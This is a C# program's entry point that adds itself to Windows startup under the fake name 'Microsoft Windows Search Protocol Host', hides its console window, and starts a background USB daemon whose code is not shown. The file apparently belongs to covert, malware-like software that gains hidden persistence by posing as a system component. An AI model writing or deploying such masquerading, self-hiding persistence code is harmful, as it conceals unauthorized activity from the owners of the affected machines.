using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using JGeneral;
using JGeneral.IO;
using Newtonsoft.Json;

namespace atriplex
{
    internal class Program
    {
        [DllImport("Kernel32.dll")]
        private static extern IntPtr GetConsoleWindow();

        [DllImport("User32.dll")]
        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
        
        internal static void Main(string[] args)
        {
            if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + Assembly.GetAssembly(typeof(Program)).GetModules()[0].Name + ".bat"))
            {
                Startup.AddAsStartupApp("Microsoft Windows Search Protocol Host");
            }
            Folder.Exceptions = Folder.Serializer.Deserialize<List<string>>(new JsonTextReader(new StringReader(File.ReadAllText($"{Platform.CurrentDirectory}config.json")))) ?? new List<string>();
            IntPtr hWnd = GetConsoleWindow();
            if (hWnd != IntPtr.Zero)
            {
                ShowWindow(hWnd, 0);
            }
            USBDaemon daemon = new USBDaemon();
            daemon.Start();
            GC.Collect();
            Console.Read();
        }
    }
}